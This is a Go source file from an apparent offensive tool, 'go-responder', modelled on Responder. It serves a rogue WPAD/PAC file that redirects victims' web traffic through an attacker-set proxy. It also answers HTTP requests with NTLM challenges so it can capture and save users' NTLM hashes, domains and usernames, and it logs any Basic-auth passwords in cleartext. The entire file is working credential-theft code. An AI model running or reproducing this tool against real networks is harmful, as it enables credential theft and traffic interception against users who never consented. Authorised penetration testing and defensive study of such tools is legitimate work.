package server

import (
	"encoding/base64"
	"fmt"
	"io"
	"net"
	"net/http"
	"strings"
	"sync"

	"go-responder/internal/core"
)

var connChallenges sync.Map

func ServeHTTP(ifaceIP net.IP) {
	mux := http.NewServeMux()
	if core.WPADEnabled {
		mux.HandleFunc("/wpad.dat", handleWPAD)
		mux.HandleFunc("/wpad/wpad.dat", handleWPAD)
		mux.HandleFunc("/proxy.pac", handleWPAD)
	}
	mux.HandleFunc("/", HandleHTTPNTLM)

	addr := fmt.Sprintf("%s:80", ifaceIP)
	ln, err := net.Listen("tcp", addr)
	if err != nil {
		core.LogError("HTTP listen %s - %v (need root?)", addr, err)
		return
	}
	core.LogInfo("HTTP listening on %s:80", ifaceIP)
	if core.WPADEnabled {
		core.LogInfo("WPAD  serving PAC file at http://%s/wpad.dat (proxy: %s)", ifaceIP, core.WPADProxyHost)
	}
	http.Serve(ln, mux)
}

func handleWPAD(w http.ResponseWriter, r *http.Request) {
	core.LogInfo("[WPAD] PAC file requested by %s", r.RemoteAddr)
	proxy := core.WPADProxyHost
	if proxy == "" {
		host, _, _ := net.SplitHostPort(r.Host)
		if host == "" {
			host = r.Host
		}
		proxy = fmt.Sprintf("%s:3128", host)
	}
	pac := fmt.Sprintf(`function FindProxyForURL(url, host) {
    if (isInNet(host, "127.0.0.0", "255.0.0.0")) { return "DIRECT"; }
    return "PROXY %s; DIRECT";
}
`, proxy)
	w.Header().Set("Content-Type", "application/x-ns-proxy-autoconfig")
	w.Header().Set("Content-Length", fmt.Sprintf("%d", len(pac)))
	w.WriteHeader(200)
	w.Write([]byte(pac))
}

func HandleHTTPNTLM(w http.ResponseWriter, r *http.Request) {
	io.Copy(io.Discard, r.Body)

	auth := r.Header.Get("Authorization")

	if auth == "" {
		core.LogVerbose("HTTP connection from %s - sending NTLM negotiate", r.RemoteAddr)
		w.Header().Set("WWW-Authenticate", "NTLM")
		w.Header().Set("Connection", "keep-alive")
		w.WriteHeader(401)
		return
	}

	if strings.HasPrefix(strings.ToUpper(auth), "BASIC ") {
		decoded, err := base64.StdEncoding.DecodeString(auth[6:])
		if err == nil {
			core.LogSuccess("[HTTP] Basic auth cleartext from %s: %s", r.RemoteAddr, string(decoded))
		}
		w.Header().Set("WWW-Authenticate", "NTLM")
		w.WriteHeader(401)
		return
	}

	if !strings.HasPrefix(strings.ToUpper(auth), "NTLM ") {
		w.Header().Set("WWW-Authenticate", "NTLM")
		w.WriteHeader(401)
		return
	}

	raw, err := base64.StdEncoding.DecodeString(auth[5:])
	if err != nil {
		w.WriteHeader(400)
		return
	}

	ntlm := core.FindNTLMSSP(raw)
	if len(ntlm) < 12 {
		w.WriteHeader(400)
		return
	}

	switch core.NTLMMsgType(ntlm) {
	case 1:
		ws, dom, osVer := core.ParseNTLMNegotiate(ntlm)
		if ws != "" || dom != "" {
			core.LogVerbose("HTTP NTLM Type1 from %s - workstation=%s domain=%s os=%s", r.RemoteAddr, ws, dom, osVer)
		} else {
			core.LogVerbose("HTTP NTLM Type1 from %s - issuing challenge", r.RemoteAddr)
		}
		challenge := core.GetChallenge()
		connChallenges.Store(r.RemoteAddr, challenge)
		ntlmChallenge := core.BuildNTLMChallenge(challenge, core.SessionDomain, core.SessionMachineName)
		encoded := base64.StdEncoding.EncodeToString(ntlmChallenge)
		w.Header().Set("WWW-Authenticate", "NTLM "+encoded)
		w.Header().Set("Connection", "keep-alive")
		w.WriteHeader(401)

	case 3:
		val, ok := connChallenges.Load(r.RemoteAddr)
		if !ok {
			w.WriteHeader(401)
			return
		}
		challenge := val.([8]byte)
		connChallenges.Delete(r.RemoteAddr)

		hash, user, domain, ntlmVer, err := core.ParseNTLMAuthenticate(ntlm, challenge)
		if err != nil {
			core.LogVerbose("HTTP NTLM parse: %v", err)
			w.WriteHeader(401)
			return
		}
		core.LogSuccess("[HTTP] %s captured from %s", ntlmVer, r.RemoteAddr)
		core.LogSuccess("       %s\\%s", domain, user)
		core.LogSuccess("       %s", hash)
		core.SaveHash(hash)
		w.Header().Set("WWW-Authenticate", "NTLM")
		w.WriteHeader(401)

	default:
		w.WriteHeader(400)
	}
}
